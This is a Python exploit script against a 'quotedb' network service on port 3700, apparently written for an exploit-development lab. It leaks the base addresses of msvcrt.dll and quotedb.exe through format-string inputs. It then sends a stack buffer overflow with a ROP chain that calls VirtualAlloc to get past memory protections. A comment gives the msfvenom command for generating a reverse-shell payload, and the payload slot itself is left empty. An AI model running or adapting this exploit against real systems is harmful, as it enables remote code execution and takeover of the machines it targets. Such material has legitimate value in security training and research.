#!/usr/bin/python
import socket
import sys
from struct import pack
import time


server = sys.argv[1]
port = 3700


def send_message(buffer):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buffer)
    res = (s.recv(1024))
    s.close()
    return res


def list_quotes(max_limit):
    for i in range(0,int(max_limit)):
        buffer = b"\x85\x03\x00\x00"
        buffer += pack("<i", i)
        res = send_message(buffer)
        print(res)


def delete_quotes(max_limit):
    # Delete all quotes:
    for i in range(0,int(max_limit)):
        buffer = b"\x88\x03\x00\x00"
        buffer += pack("<i", 0)
        send_message(buffer)


def get_base_address_msvcrt():
    # Delete all quotes
    delete_quotes(30)

    # Add quote 0
    buffer = b"\x86\x03\x00\x00"
    buffer += b"%s%d"*30
    send_message(buffer)

    # Get quote 0
    buffer = b"\x85\x03\x00\x00"
    buffer += pack("<i", 0)
    res = send_message(buffer)
    retval = str((res.hex()))
    retval = [retval[i:i+2] for i in range(0, len(retval), 2)]
    retval.reverse()
    retval = ["".join(retval[i:i+4]) for i in range(0,len(retval),4)]
    retval.reverse()

    leaked_address = retval[14]
    msvcrt = int(leaked_address,16) - 0xb6228
    print("Leaked msvcrt.dll address: 0x%s"%leaked_address)
    print("msvcrt.dll base address:   %s"%hex(msvcrt))
    return msvcrt


def get_base_address_quotedb():
    # Delete all quotes
    delete_quotes(30)

    # Add quote 0
    buffer = b"\x86\x03\x00\x00"
    #buffer += pack("<i", 10)
    buffer += b"%x:" * 30
    send_message(buffer)

    # Get quote 0
    buffer = b"\x85\x03\x00\x00"
    buffer += pack("<i", 0)
    res = send_message(buffer)

    leaked_address = str(res).split(":")[2]
    print("Leaked quotedb address:    0x%s"%leaked_address)

    # quotedb = [leaked_address[i:i+2] for i in range(0, len(leaked_address), 2)]
    quotedb = int("0x"+leaked_address, 16) 
    quotedb = quotedb // 0x10000
    quotedb = quotedb * 0x10000

    print("Quotedb.exe base address:  %s"%(hex(quotedb)))
    return quotedb


def eip_overwrite(quotedb, msvcrt):
    #va = pack("<L", (0x45454545)) # dummy VirtualAlloc Address
    va = pack("<L", (quotedb+0x43218)) # dummy VirtualAlloc Address
    va += pack("<L", (0x46464646)) # Shellcode Return Address
    va += pack("<L", (0x47474747)) # # dummy Shellcode Address
    va += pack("<L", (0x00000001)) # dummy dwSize
    va += pack("<L", (0x00001000)) # # dummy flAllocationType
    va += pack("<L", (0x00000040)) # dummy flProtect

    rop =  b""
    # VirtualAlloc
    rop += pack("<i", quotedb+0x25c0) # 0x004025c0: xor eax, eax ; ret  ;
    rop += pack("<i", quotedb+0x1e69) # 0x00401e69: or eax, esp ; ret  ;
    rop += pack("<i", quotedb+0x2b38) # 0x00402b38: pop ecx ; ret  ;
    rop += pack("<L", 0xffffffe0) # -20
    rop += pack("<i", quotedb+0x9b36) # 0x00409b36: add eax, ecx ; pop ebx ; ret  ;
    rop += pack("<i", 0x42424242) # Junk to EBX
    rop += pack("<i", quotedb+0x1e73) # 0x00401e73: mov ebx, eax ; ret  ;
    rop += pack("<i", quotedb+0x1e6c) # 0x00401e6c: mov eax, dword [eax] ; add ecx, 0x05 ; pop edx ; ret  ;
    rop += pack("<i", 0x42424242) # Junk to EDX
    rop += pack("<i", quotedb+0x1e6c) # 0x00401e6c: mov eax, dword [eax] ; add ecx, 0x05 ; pop edx ; ret  ;
    rop += pack("<i", 0x42424242) # Junk to EDX
    rop += pack("<i", quotedb+0x1e7a) # 0x00401e7a: mov dword [ebx], eax ; ret  ; -------------------------- bp quotedb+0x1e7a; g
    
    # Return address
    rop += pack("<i", quotedb+0x1e82) # 0x00401e82: add ebx, 0x04 ; ret  ;
    rop += pack("<i", quotedb+0x5306) # 0x00405306: mov eax, ebx ; pop ebx ; pop esi ; ret  ;
    rop += (pack("<i", 0x42424242)*2) # Junk to EBX, ESI
    rop += pack("<i", quotedb+0x1e73) # 0x00401e73: mov ebx, eax ; ret  ;
    rop += (pack("<i", msvcrt+0x54a16)*20) # rop_msvcrt.txt:0x10154a16: add eax, 0x0C ; ret  ;  (1 found)
    rop += pack("<i", quotedb+0x1e7a) # 0x00401e7a: mov dword [ebx], eax ; ret  ;

    # lpAddress
    rop += pack("<i", quotedb+0x1e82) # 0x00401e82: add ebx, 0x04 ; ret  ;
    rop += pack("<i", quotedb+0x1e7a) # 0x00401e7a: mov dword [ebx], eax ; ret  ;

    # Call VirtualAlloc
    rop += pack("<i", quotedb+0x5306) # 0x00405306: mov eax, ebx ; pop ebx ; pop esi ; ret  ;
    rop += (pack("<i", 0x42424242)*2) # Junk to EBX, ESI
    rop += pack("<i", quotedb+0x2b38) # 0x00402b38: pop ecx ; ret  ;
    rop += pack("<L", 0xfffffff8) # -8
    rop += pack("<i", quotedb+0x9b36) # 0x00409b36: add eax, ecx ; pop ebx ; ret  ;
    rop += pack("<i", 0x42424242) # Junk to EBX
    rop += pack("<i", msvcrt+0xfa65) # rop_msvcrt.txt:0x1010fa65: xchg eax, esp ; ret  ;  (1 found)

    payload =  b"\x90"*100
    # msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.X.X -b "\x00" -v payload --smallest -f py
    payload += b"" # ADD PAYLOAD


    buffer =  b"A"*(2064-len(va))
    buffer += va
    buffer += rop
    buffer += payload
    buffer += b"C"*(10000-2064-4-len(payload))
    res = send_message(buffer)
    print(res)
    

def main():
    msvcrt = get_base_address_msvcrt()
    time.sleep(10)
    quotedb = get_base_address_quotedb()
    time.sleep(10)
    eip_overwrite(quotedb, msvcrt)


main()    